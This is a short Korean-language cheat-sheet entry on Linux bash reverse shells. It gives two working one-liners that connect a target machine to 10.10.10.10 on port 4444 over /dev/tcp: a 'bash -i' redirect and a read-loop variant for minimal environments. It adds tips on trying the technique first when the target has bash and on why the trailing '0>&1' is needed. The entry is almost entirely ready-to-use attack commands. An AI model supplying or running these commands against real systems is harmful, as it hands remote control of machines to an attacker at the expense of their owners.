# linux bash reverse shell

타깃에 bash가 있을 때 가장 먼저 시도한다. `/dev/tcp`는 bash 전용이라 dash/ash(sh)에서는 안 된다.

```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

```bash
# bash -i 가 붙지 않는 최소 환경 (read 루프)
exec 5<>/dev/tcp/10.10.10.10/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
```

- 끝의 `0>&1`이 stdin을 소켓으로 돌린다. 빠지면 명령을 못 받는다.
